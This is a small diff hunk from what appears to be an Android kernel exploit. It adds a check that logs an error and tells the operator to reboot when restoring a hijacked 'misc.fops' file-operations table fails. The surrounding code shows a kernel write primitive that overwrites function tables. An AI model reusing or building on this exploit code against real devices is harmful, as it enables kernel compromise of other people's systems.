@@ -258,6 +258,15 @@ fail:
     }
     cfi_restore_ret = configfs_write_once(
         fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
+    if (cfi_restore_ret != (ssize_t)sizeof(original_fops_fail)) {
+      /* misc.fops is still hijacked and this fd dispatches through a
+       * page we don't own: the next ashmem open/fdinfo scan on ANY
+       * process can PC-fault the kernel (dmabuf_dump/misc_open landmine).
+       * Loud on purpose — a reboot is cheaper than a panic. */
+      pr_error("cfi STALE HIJACK: misc.fops restore failed ret=%zd — "
+               "REBOOT before retrying, do not hammer attempts\n",
+               cfi_restore_ret);
+    }
     if (can_read_back &&
         cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
       uint64_t after_fail = 0;
